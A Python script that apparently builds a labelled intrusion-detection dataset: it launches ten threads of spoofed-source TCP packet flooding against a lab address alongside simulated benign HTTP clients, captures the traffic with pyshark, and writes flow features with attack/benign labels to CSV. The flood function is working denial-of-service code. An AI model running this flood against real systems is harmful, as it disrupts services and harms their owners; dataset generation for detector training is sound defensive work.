import scapy.all as scapy
import threading
import time
import random
import pyshark
import pandas as pd
import numpy as np
from collections import defaultdict

# Define interface and parameters
INTERFACE = "Wi-Fi 2"
CAPTURE_DURATION = 900
OUTPUT_CSV = "captured_traffic_with_labels.csv"

# Flow statistics storage
flow_stats = defaultdict(lambda: {
    "Start Time": None, 
    "Last Packet Time": None,
    "Total Length of Fwd Packets": 0,
    "Total Backward Packets": 0,
    "Fwd Packet Lengths": [],
    "Packet Lengths": [],
    "Fwd IATs": [],
    "Bwd IATs": [],
    "Active Times": [],
    "Idle Times": [],
    "act_data_pkt_fwd": 0,
    "Subflow Fwd Bytes": 0,
    "Label": "benign"
})

start_time = None

# Target
TARGET_IP = "192.168.1.100"
TARGET_PORT = 80

BENIGN_USERS = [
    "192.168.1.10", "192.168.1.20", "192.168.1.30", "192.168.1.40",
    "192.168.1.50", "192.168.1.60", "192.168.1.70", "192.168.1.80",
    "192.168.1.90", "192.168.1.100", "192.168.1.110", "192.168.1.120",
    "192.168.1.130", "192.168.1.140", "192.168.1.150"
]

ATTACKER_IPS = ["192.168.2.50", "192.168.2.51", "192.168.2.52", "192.168.2.53", "192.168.2.54"]

# Increase the number of attack threads
NUM_ATTACK_THREADS = 10  # Match the benign traffic count

def syn_flood():
    while True:
        src_ip = random.choice(ATTACKER_IPS)
        sport = random.randint(1024, 65535)
        flags = random.choice(["S", "SA", "R", "FA"])

        ip = scapy.IP(src=src_ip, dst=TARGET_IP)
        tcp = scapy.TCP(sport=sport, dport=TARGET_PORT, flags=flags, seq=random.randint(1000, 9000))
        payload = scapy.Raw(load=bytes(random.randint(10, 100)))

        packet = ip / tcp / payload
        scapy.send(packet, verbose=False)

        # Reduce sleep time for higher attack intensity
        time.sleep(random.uniform(0.001, 0.01))  # Attack runs much faster now

def benign_traffic(src_ip):
    while True:
        sport = random.randint(1024, 65535)
        ip = scapy.IP(src=src_ip, dst=TARGET_IP)
        tcp = scapy.TCP(sport=sport, dport=TARGET_PORT, flags="PA")

        http_get = "GET /index.html HTTP/1.1\r\nHost: example.com\r\n\r\n"
        tcp_payload = scapy.Raw(load=http_get) if random.random() > 0.3 else scapy.Raw(load="Hello, server!")

        packet = ip / tcp / tcp_payload
        scapy.send(packet, verbose=False)

        # Keep benign traffic at a normal pace
        time.sleep(random.uniform(1, 3))

# Launch multiple attack threads for balance
attack_threads = [threading.Thread(target=syn_flood, daemon=True) for _ in range(NUM_ATTACK_THREADS)]
benign_threads = [threading.Thread(target=benign_traffic, args=(ip,), daemon=True) for ip in BENIGN_USERS]

# Start attack threads
for thread in attack_threads:
    thread.start()

# Start benign threads
for thread in benign_threads:
    thread.start()

# Packet processing function

def process_packet(packet):
    global start_time
    try:
        if (hasattr(packet, "ip") or hasattr(packet, "ipv6")) and hasattr(packet, "transport_layer"):
            
            if hasattr(packet, "ip"):
                src_ip = getattr(packet.ip, "src", None)
                dst_ip = getattr(packet.ip, "dst", None)
            else:
                src_ip = getattr(packet.ipv6, "src", None)
                dst_ip = getattr(packet.ipv6, "dst", None)
            
            protocol = packet.transport_layer
            timestamp = float(packet.sniff_time.timestamp())
            
            if hasattr(packet[protocol], "srcport") and hasattr(packet[protocol], "dstport"):
                src_port = int(getattr(packet[protocol], "srcport", 0))
                dst_port = int(getattr(packet[protocol], "dstport", 0))
                pkt_length = int(getattr(packet, "length", 0))

                if start_time is None:
                    start_time = timestamp

                flow_key = (src_ip, src_port, dst_ip, dst_port, protocol)

                if flow_stats[flow_key]["Start Time"] is None:
                    flow_stats[flow_key]["Start Time"] = timestamp

                last_time = flow_stats[flow_key]["Last Packet Time"]
                flow_stats[flow_key]["Last Packet Time"] = timestamp

                # Compute inter-arrival times
                if last_time:
                    iat = timestamp - last_time
                    if src_ip == getattr(packet, "ip", getattr(packet, "ipv6", None)).src:
                        flow_stats[flow_key]["Fwd IATs"].append(iat)
                    else:
                        flow_stats[flow_key]["Bwd IATs"].append(iat)

                # Active and idle time calculation
                if last_time:
                    time_diff = timestamp - last_time
                    if time_diff < 1:  # Active threshold
                        flow_stats[flow_key]["Active Times"].append(time_diff)
                    else:
                        flow_stats[flow_key]["Idle Times"].append(time_diff)

                # Store forward and backward packet lengths
                flow_stats[flow_key]["Packet Lengths"].append(pkt_length)
                if src_ip == getattr(packet, "ip", getattr(packet, "ipv6", None)).src:
                    flow_stats[flow_key]["Fwd Packet Lengths"].append(pkt_length)
                    flow_stats[flow_key]["Total Length of Fwd Packets"] += pkt_length
                    flow_stats[flow_key]["Subflow Fwd Bytes"] += pkt_length
                    if hasattr(packet[protocol], "flags") and int(getattr(packet[protocol], "flags", "0"), 16) & 0x10:
                        flow_stats[flow_key]["act_data_pkt_fwd"] += 1
                else:
                    flow_stats[flow_key]["Total Backward Packets"] += 1
                
                # **New: Detect SYN Flood Attack**
                if src_ip in ATTACKER_IPS:
                    flow_stats[flow_key]["Label"] = "attack"
                else:
                    flow_stats[flow_key]["Label"] = "benign"

                

    except Exception as e:
        print(f"Error processing packet: {e}")


# Start capture
print(f"Capturing on {INTERFACE} for {CAPTURE_DURATION} seconds...")
capture = pyshark.LiveCapture(interface=INTERFACE)

start_time = time.time()
for packet in capture.sniff_continuously():
    if time.time() - start_time > CAPTURE_DURATION:
        break
    process_packet(packet)

# Compute features
data = []
for flow_key, stats in flow_stats.items():
    duration = max((stats["Last Packet Time"] - stats["Start Time"]), 1e-10)
    feature_vector = {
        "Flow Duration": duration,
        "Flow Bytes/s": stats["Total Length of Fwd Packets"] / duration,
        "Flow Packets/s": len(stats["Packet Lengths"]) / duration,
        "Total Length of Fwd Packets": stats["Total Length of Fwd Packets"],
        "Total Backward Packets": stats["Total Backward Packets"],
        "Subflow Fwd Bytes": stats["Subflow Fwd Bytes"],
        "Fwd Packet Length Min": min(stats["Fwd Packet Lengths"], default=0),
        "Fwd Packet Length Max": max(stats["Fwd Packet Lengths"], default=0),
        "Fwd Packet Length Mean": np.mean(stats["Fwd Packet Lengths"]) if stats["Fwd Packet Lengths"] else 0,
        "Packet Length Std": np.std(stats["Packet Lengths"], dtype=np.float64) if stats["Packet Lengths"] else 0,
        "Packet Length Variance": np.var(stats["Packet Lengths"], dtype=np.float64) if stats["Packet Lengths"] else 0,
        "Bwd IAT Max": max(stats["Bwd IATs"], default=0),
        "Bwd IAT Std": np.std(stats["Bwd IATs"], dtype=np.float64) if stats["Bwd IATs"] else 0,
        "Bwd IAT Total": sum(stats["Bwd IATs"]),
        "Active Max": max(stats["Active Times"], default=0),
        "Active Mean": np.mean(stats["Active Times"], dtype=np.float64) if stats["Active Times"] else 0,
        "Idle Max": max(stats["Idle Times"], default=0),
        "Idle Mean": np.mean(stats["Idle Times"], dtype=np.float64) if stats["Idle Times"] else 0,
        "act_data_pkt_fwd": stats["act_data_pkt_fwd"],
        "Label": stats["Label"]
    }
    data.append(feature_vector)

# Save to CSV
pd.DataFrame(data).to_csv(OUTPUT_CSV, index=False, float_format="%.10f")
print(f"Results saved to {OUTPUT_CSV}")


